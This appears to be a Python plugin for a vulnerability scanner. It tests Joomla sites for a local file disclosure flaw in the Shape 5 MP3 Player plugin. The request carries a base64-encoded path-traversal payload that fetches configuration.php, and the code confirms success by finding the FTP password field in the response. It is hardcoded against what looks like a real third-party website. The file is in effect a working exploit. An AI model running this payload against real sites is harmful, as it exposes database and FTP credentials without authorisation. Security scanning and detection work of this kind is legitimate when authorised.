#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = fyxy
#_PlugName_ = Joomla Shape 5 MP3 Player 2.0 Plugin LFD
#__Refer___ = http://0day.today/exploits/24724
import re
def assign(service, arg):
    if service == 'joomla':
        return True, arg
def audit(arg):
    payload = 'plugins/content/s5_media_player/helper.php?fileurl=Li4vLi4vLi4vY29uZmlndXJhdGlvbi5waHA='
    target = arg + payload
    
    code, head, res, errcode, _ = curl.curl2(target);
    if code == 200 and "public $ftp_pass" in res and "class JConfig {" in res:
        security_hole(target)
if __name__ == '__main__':
    from dummy import *
    audit(assign('joomla', 'http://www.goodcounsel.org/')[1])